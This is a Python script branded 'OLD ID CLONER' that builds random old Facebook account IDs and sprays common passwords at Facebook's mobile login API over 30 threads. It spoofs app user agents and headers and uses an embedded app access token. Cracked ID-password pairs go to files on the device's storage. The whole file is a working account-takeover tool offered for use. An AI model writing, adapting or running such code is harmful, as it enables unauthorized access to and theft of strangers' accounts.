import os
import sys
import uuid
import json
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor

loop = 0
oks = []
cps = []
bou = []

def windows():
    ua1 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629337;FBDM/{density=1.325,width=1280,height=736};FBLC/uk_UA;FBRV/210796532;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X304L;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027740;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/0;FBCR/Iliad;FBMF/Meizu;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/M6 Note;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.825,width=1440,height=2696};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H9436;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125778;FBDM/{density=2.25,width=720,height=1332};FBLC/en_US;FBRV/214824289;FBCR/cricket;FBMF/Alcatel;FBBD/TCL;FBPN/com.facebook.katana;FBDV/Alcatel_5008R;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua6 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=2.0,width=720,height=1412};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    max = random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7])
    return str(max)
    
def banner():
    os.system("clear")
    print(" [>] OLD ID CLONER")
    print(" [>] VERSION : 1.0")
    print(30*"-")

def genr(num,ids):
    for a in range(int(num)):
        awm = "".join(random.choice(string.digits) for _ in range(int(ids)))
        bou.append(awm)

def main():
    banner()
    print(" [>] 8,9 == 2009,2010 Series")
    print(" [>] EXAMPLE : 8,9")
    ids = input(" [>] SELECT  : ")
    print(" [>] EXAMPLE : 5000")
    num = input(" [>] SELECT  : ")
    genr(num,ids)
    print(30*"-")
    with ThreadPoolExecutor(max_workers=30) as OldCrack:
        for uid in bou:
            if ids == "8":idf = "1000000"+uid
            elif ids == "9":idf = "100000"+uid
            else:idf = "100000"+uid
            passlist = ["123456","1234567","12345678","123456789","password"]
            OldCrack.submit(cracker,idf,passlist)
    print(" [>] CRACK DONE")

def cracker(idf,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\x1b[m [>] AIMAN-XD|•| {loop}|•|\x1b[92m{len(oks)}\x1b[m|\x1b[91m{len(cps)}\r")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ses = requests.Session()
            headers = {
            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': windows(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger'}
            url = "https://b-api.facebook.com/method/auth.login?format=json&email="+idf+"&password="+pas+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            response = ses.get(url,headers=headers).json()
            if "access_token" in response:
                print(f"\r \x1b[92m[OK] • {idf} • {pas}")
                open("/sdcard/OLD-OK.txt","a").write(idf+"|"+pas+"\n")
                oks.append(idf)
                break
            elif "www.facebook.com" in response["error_msg"]:
                print(f"\r \x1b[91m[CP] • {idf} • {pas}")
                open("/sdcard/OLD-CP.txt","a").write(idf+"|"+pas+"\n")
                cps.append(idf)
                break
            else:continue
        loop += 1
    except Exception as e:pass

if __name__ == "__main__":
    main()
